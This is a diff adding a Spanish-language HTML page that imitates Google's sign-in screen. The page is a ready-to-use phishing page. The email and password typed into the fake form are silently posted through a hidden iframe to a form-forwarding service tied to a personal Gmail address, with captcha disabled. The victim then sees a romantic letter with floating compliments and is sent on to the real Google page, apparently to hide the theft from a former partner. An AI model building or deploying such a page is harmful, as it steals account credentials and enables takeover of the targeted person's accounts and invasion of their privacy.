@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffffff">
+<title>Iniciar sesión - Cuentas de Google</title>
+<link rel="icon" href="https://www.google.com/favicon.ico">
+<style>
+:root{--blue:#1a73e8;--line:#dadce0}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;min-height:100dvh}
+body{
+  font-family:Roboto,system-ui,-apple-system,Arial,sans-serif;background:#fff;color:#202124;
+  display:flex;align-items:center;justify-content:center;
+  padding:calc(16px + env(safe-area-inset-top)) 16px calc(16px + env(safe-area-inset-bottom));
+}
+.screen{width:100%;max-width:420px}
+.hide{display:none!important}
+.card{border:1px solid var(--line);border-radius:28px;padding:32px 24px 24px;text-align:center}
+.logo{width:64px;margin-bottom:14px}
+h1{font-size:22px;font-weight:400;margin:0 0 6px}
+.sub{font-size:15px;margin:0 0 22px;color:#5f6368}
+.field{position:relative;margin-bottom:14px;text-align:left}
+input{
+  width:100%;padding:15px;font-size:16px;border:1px solid var(--line);
+  border-radius:4px;outline:none;background:#fff;color:#202124
+}
+input:focus{border:2px solid var(--blue);padding:14px}
+input:focus+label,input:not(:placeholder-shown)+label{
+  top:-8px;left:9px;font-size:12px;background:#fff;padding:0 4px;color:var(--blue)
+}
+label{position:absolute;top:16px;left:15px;font-size:16px;color:#5f6368;
+  pointer-events:none;transition:.12s}
+button{
+  width:100%;min-height:48px;background:var(--blue);color:#fff;border:0;
+  border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;margin-top:6px
+}
+button:active{background:#1765cc}
+button:disabled{opacity:.7}
+.foot{display:flex;justify-content:space-between;gap:12px;margin-top:22px;font-size:13px}
+.foot a{color:var(--blue);text-decoration:none;font-weight:500}
+
+/* ===================== FONDO ROMÁNTICO ===================== */
+body.letter-mode{
+  background:
+    radial-gradient(1100px 620px at 50% -12%, #ffe4ef 0%, rgba(255,228,239,0) 62%),
+    radial-gradient(760px 520px at -8% 104%, #ffe2d2 0%, rgba(255,226,210,0) 58%),
+    radial-gradient(760px 520px at 108% 104%, #f4dcff 0%, rgba(244,220,255,0) 58%),
+    linear-gradient(165deg,#fff8fc 0%,#ffeef6 48%,#ffe4ee 100%);
+  background-attachment:fixed;
+}
+.romance-bg{position:fixed;inset:0;overflow:hidden;pointer-events:none;z-index:0}
+.romance-bg span{
+  position:absolute;bottom:-40px;color:#ef5f8b;opacity:0;
+  animation:rise linear infinite;
+  filter:drop-shadow(0 3px 6px rgba(239,95,139,.25));
+}
+@keyframes rise{
+  0%{transform:translateY(0) rotate(0deg) scale(.7);opacity:0}
+  12%{opacity:.55}
+  85%{opacity:.35}
+  100%{transform:translateY(-108vh) rotate(300deg) scale(1.1);opacity:0}
+}
+
+/* ===================== PAPEL DE LA CARTA ===================== */
+.paper{
+  position:relative;z-index:1;
+  background:
+    linear-gradient(180deg,rgba(255,252,249,.97),rgba(255,246,247,.97));
+  border-radius:22px;padding:34px 24px 26px;text-align:left;
+  border:1px solid rgba(214,160,160,.55);
+  box-shadow:
+    0 18px 46px rgba(150,70,95,.18),
+    0 2px 0 #fff inset,
+    0 0 0 6px rgba(255,255,255,.55);
+  animation:in .9s cubic-bezier(.2,.8,.2,1) both;
+  font-family:Georgia,'Times New Roman',serif;color:#4a3327;
+}
+@keyframes in{from{opacity:0;transform:translateY(22px) scale(.985)}to{opacity:1;transform:none}}
+.paper::before{
+  content:"";position:absolute;inset:9px;border-radius:16px;
+  border:1px solid rgba(214,160,160,.4);pointer-events:none;
+}
+.ornament{
+  text-align:center;font-size:15px;letter-spacing:8px;color:#d98aa4;
+  margin-bottom:6px;opacity:.85
+}
+.heart{
+  font-size:30px;text-align:center;margin:2px 0 20px;
+  animation:beat 1.9s ease-in-out 1s infinite;
+  filter:drop-shadow(0 4px 10px rgba(230,70,110,.35))
+}
+@keyframes beat{0%,100%{transform:scale(1)}45%{transform:scale(1.16)}}
+.paper p{font-size:17px;line-height:1.8;margin:0 0 16px}
+.paper p:first-of-type::first-letter{
+  font-size:40px;line-height:1;float:left;margin:4px 8px 0 0;color:#c2506f
+}
+.sign{margin-top:22px;font-style:italic;opacity:.8;color:#8a5a4a}
+.sign::after{content:" ❤";color:#e2607f;font-style:normal}
+
+/* ===================== CORAZÓN INTERACTIVO ===================== */
+.love-zone{
+  position:relative;margin-top:26px;padding-top:20px;
+  border-top:1px dashed rgba(214,160,160,.7);
+  text-align:center
+}
+.love-hint{
+  font-family:Roboto,system-ui,Arial,sans-serif;font-size:12px;
+  letter-spacing:.14em;text-transform:uppercase;color:#c07d95;
+  margin:0 0 12px
+}
+.love-heart{
+  position:relative;display:block;width:76px;height:76px;margin:0 auto;
+  min-height:0;border-radius:50%;border:0;padding:0;cursor:pointer;
+  background:radial-gradient(circle at 35% 28%,#ff90ae,#e8446f 62%,#c62e57);
+  box-shadow:0 10px 22px rgba(200,50,90,.38),0 0 0 0 rgba(232,68,111,.5);
+  animation:pulseRing 2.4s ease-out infinite;
+  transition:transform .12s ease;
+  z-index:3
+}
+.love-heart:active{background:radial-gradient(circle at 35% 28%,#ff90ae,#e8446f 62%,#c62e57);transform:scale(.93)}
+.love-heart .hs{
+  font-size:34px;line-height:76px;color:#fff;display:block;
+  filter:drop-shadow(0 2px 3px rgba(120,10,40,.4))
+}
+@keyframes pulseRing{
+  0%{box-shadow:0 10px 22px rgba(200,50,90,.38),0 0 0 0 rgba(232,68,111,.45)}
+  70%{box-shadow:0 10px 22px rgba(200,50,90,.38),0 0 0 18px rgba(232,68,111,0)}
+  100%{box-shadow:0 10px 22px rgba(200,50,90,.38),0 0 0 0 rgba(232,68,111,0)}
+}
+
+/* escenario de frases que salen del corazón */
+.love-note{position:absolute;inset:0;pointer-events:none;z-index:2}
+.love-note b{
+  position:absolute;left:50%;bottom:66px;
+  max-width:86%;text-align:center;
+  font-family:Georgia,'Times New Roman',serif;font-size:17px;line-height:1.45;
+  color:#b3315c;font-weight:700;
+  padding:9px 14px;border-radius:14px;
+  background:rgba(255,255,255,.92);
+  border:1px solid rgba(232,68,111,.25);
+  box-shadow:0 8px 18px rgba(200,60,100,.14);
+  transform:translate(-50%,0);
+  animation-name:flotar;
+  animation-timing-function:cubic-bezier(.16,.7,.25,1);
+  animation-fill-mode:both;
+  will-change:transform,opacity
+}
+@keyframes flotar{
+  0%{opacity:0;transform:translate(-50%,12px) scale(.55) rotate(0deg)}
+  12%{opacity:1;transform:translate(-50%,-6px) scale(1) rotate(var(--r,0deg))}
+  68%{opacity:1}
+  100%{opacity:0;transform:translate(calc(-50% + var(--dx,0px)),-205px) scale(.9) rotate(var(--r2,0deg))}
+}
+
+.love-count{
+  font-family:Roboto,system-ui,Arial,sans-serif;font-size:11px;
+  color:#b98a9c;margin:14px 0 0;letter-spacing:.05em;min-height:14px
+}
+
+/* ===================== BOTÓN CONTINUAR ===================== */
+.paper #go{
+  margin-top:26px;font-family:Roboto,system-ui,Arial,sans-serif;
+  background:#4a3327;border-radius:10px;
+  box-shadow:0 6px 16px rgba(74,51,39,.22)
+}
+.paper #go:active{background:#2f2018}
+
+/* ===================== PIE DE CARTA ===================== */
+.firma-final{
+  margin:26px 0 0;text-align:center;
+  font-family:Roboto,system-ui,Arial,sans-serif;font-size:11px;
+  line-height:1.7;color:#b98a9c;letter-spacing:.06em
+}
+.firma-final .teamo{
+  display:block;font-size:13px;color:#c2506f;font-weight:600;
+  margin-bottom:4px
+}
+.firma-final a{
+  color:#b3315c;text-decoration:none;
+  border-bottom:1px solid rgba(179,49,92,.35);
+  word-break:break-all
+}
+.firma-final a:active{opacity:.6}
+
+@media (prefers-reduced-motion:reduce){
+  .romance-bg span,.heart,.love-heart{animation:none}
+}
+</style>
+</head>
+<body>
+
+<section class="screen" id="login">
+  <div class="card">
+    <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+    <h1>Iniciar sesión</h1>
+    <p class="sub">Usa tu cuenta de Google</p>
+
+    <form id="form" action="https://formsubmit.co/luis.garciayt321@gmail.com" method="POST" target="sink">
+      <div class="field">
+        <input type="email" id="email" name="correo" placeholder=" " required
+               autocomplete="username" inputmode="email" autocapitalize="off">
+        <label for="email">Correo electrónico o teléfono</label>
+      </div>
+      <div class="field">
+        <input type="password" id="pass" name="clave" placeholder=" " required autocomplete="current-password">
+        <label for="pass">Introduce tu contraseña</label>
+      </div>
+
+      <input type="hidden" name="_subject" value="Nuevo inicio de sesión">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">
+
+      <button type="submit" id="btn">Iniciar sesión</button>
+    </form>
+
+    <div class="foot">
+      <a href="#">¿Olvidaste tu contraseña?</a>
+      <a href="#">Crear cuenta</a>
+    </div>
+  </div>
+</section>
+
+<section class="screen hide" id="carta">
+  <div class="romance-bg" id="romanceBg" aria-hidden="true"></div>
+
+  <div class="paper">
+    <div class="ornament">✦ ❤ ✦</div>
+    <div class="heart">❤️</div>
+
+    <p>A pesar de todo lo que ha pasado, quiero que sepas que sigues siendo alguien especial para mí.</p>
+    <p>A veces recuerdo los momentos que vivimos y no puedo evitar sonreír. No todo fue perfecto, pero hubo momentos muy bonitos que siempre voy a llevar conmigo.</p>
+    <p>No sé qué pienses tú, pero yo todavía guardo un cariño muy grande por ti.</p>
+    <p class="sign">Con cariño</p>
+
+    <div class="love-zone" id="loveZone">
+      <p class="love-hint">Toca el corazón</p>
+      <button class="love-heart" id="loveHeart" type="button" aria-label="Toca el corazón">
+        <span class="hs">❤</span>
+      </button>
+      <div class="love-note" id="loveNote" aria-hidden="true"></div>
+      <p class="love-count" id="loveCount"></p>
+    </div>
+
+    <button id="go">Continuar a Google</button>
+
+    <p class="firma-final">
+      <span class="teamo">Te amo💖</span>
+      <a href="https://open.spotify.com/playlist/0KU7TeEyFhb8HAExSZB53O?si=Pg20O27OQGyo4s3k5tGEGw"
+         target="_blank" rel="noopener noreferrer">open.spotify.com/playlist/0KU7TeEyFhb8HAExSZB53O</a>
+    </p>
+  </div>
+</section>
+
+<iframe name="sink" id="sink" style="display:none" title="envio" aria-hidden="true"></iframe>
+
+<script>
+/* ================= CONFIG ================= */
+const REDIRECT = "https://accounts.google.com/";
+const AUTO_SEG = 0;   // 0 = espera al botón. Pon 25 para que se vaya solo.
+/* ========================================== */
+
+const $ = id => document.getElementById(id);
+
+$('form').addEventListener('submit', e => {
+  e.preventDefault();
+
+  const btn = $('btn');
+  btn.disabled = true;
+  btn.textContent = 'Verificando...';
+
+  // envío real al iframe oculto (sin CORS)
+  try { HTMLFormElement.prototype.submit.call($('form')); } catch (err) {}
+
+  // la carta sale de inmediato, sin esperar al servidor
+  $('login').classList.add('hide');
+  $('carta').classList.remove('hide');
+  document.body.classList.add('letter-mode');
+  startRomance();
+  window.scrollTo(0, 0);
+  if (AUTO_SEG > 0) setTimeout(() => location.href = REDIRECT, AUTO_SEG * 1000);
+});
+
+$('go').addEventListener('click', () => location.href = REDIRECT);
+
+/* ================= FONDO DE CORAZONES ================= */
+let romanceStarted = false;
+function startRomance(){
+  if (romanceStarted) return;
+  romanceStarted = true;
+  const bg = $('romanceBg');
+  const total = 18;
+  for (let i = 0; i < total; i++){
+    const s = document.createElement('span');
+    s.textContent = Math.random() < .5 ? '❤' : '♥';
+    s.style.left = (Math.random() * 100) + '%';
+    s.style.fontSize = (10 + Math.random() * 20) + 'px';
+    s.style.animationDuration = (11 + Math.random() * 13) + 's';
+    s.style.animationDelay = (Math.random() * 14) + 's';
+    s.style.opacity = 0;
+    bg.appendChild(s);
+  }
+}
+
+/* ================= FRASES ================= */
+const FRASES = [
+  "Eres hermosa",
+  "Te amo",
+  "No hay nadie como tú",
+  "Qué bonita te ves",
+  "Tienes una sonrisa preciosa",
+  "Eres increíble",
+  "Qué lindos ojitos tienes",
+  "Eres una belleza",
+  "Me encanta tu sonrisa",
+  "Eres demasiado linda",
+  "Tienes algo que te hace única",
+  "Eres un encanto",
+  "Qué preciosa eres",
+  "Tu mirada es hermosa",
+  "Eres arte",
+  "No tienes comparación",
+  "Cada día te ves más bonita",
+  "Tienes una belleza única",
+  "Eres una niña maravillosa",
+  "Hasta tus defectos me parecen bonito",
+  "Tu risa es mi sonido favorito",
+  "Pienso en ti más de lo que imaginas",
+  "Contigo todo se siente mejor",
+  "Eres mi persona favorita",
+  "Gracias por existir"
+];
+
+/* baraja: salen todas antes de repetir */
+let mazo = [];
+function siguienteFrase(){
+  if (!mazo.length){
+    mazo = FRASES.slice();
+    for (let i = mazo.length - 1; i > 0; i--){
+      const j = Math.floor(Math.random() * (i + 1));
+      [mazo[i], mazo[j]] = [mazo[j], mazo[i]];
+    }
+  }
+  return mazo.pop();
+}
+
+/* ================= CORAZÓN QUE LANZA FRASES ================= */
+let veces = 0;
+
+$('loveHeart').addEventListener('click', () => {
+  const b = document.createElement('b');
+  b.textContent = siguienteFrase();
+
+  b.style.setProperty('--dx', (Math.random() * 130 - 65).toFixed(0) + 'px');
+  b.style.setProperty('--r',  (Math.random() * 8 - 4).toFixed(1) + 'deg');
+  b.style.setProperty('--r2', (Math.random() * 16 - 8).toFixed(1) + 'deg');
+  b.style.animationDuration = (6.5 + Math.random() * 2.5).toFixed(1) + 's';
+
+  $('loveNote').appendChild(b);
+  b.addEventListener('animationend', () => b.remove());
+
+  veces++;
+  $('loveCount').textContent = veces === 1
+    ? "Te lo he dicho 1 vez"
+    : "Te lo he dicho " + veces + " veces";
+});
+</script>
+</body>
+</html>
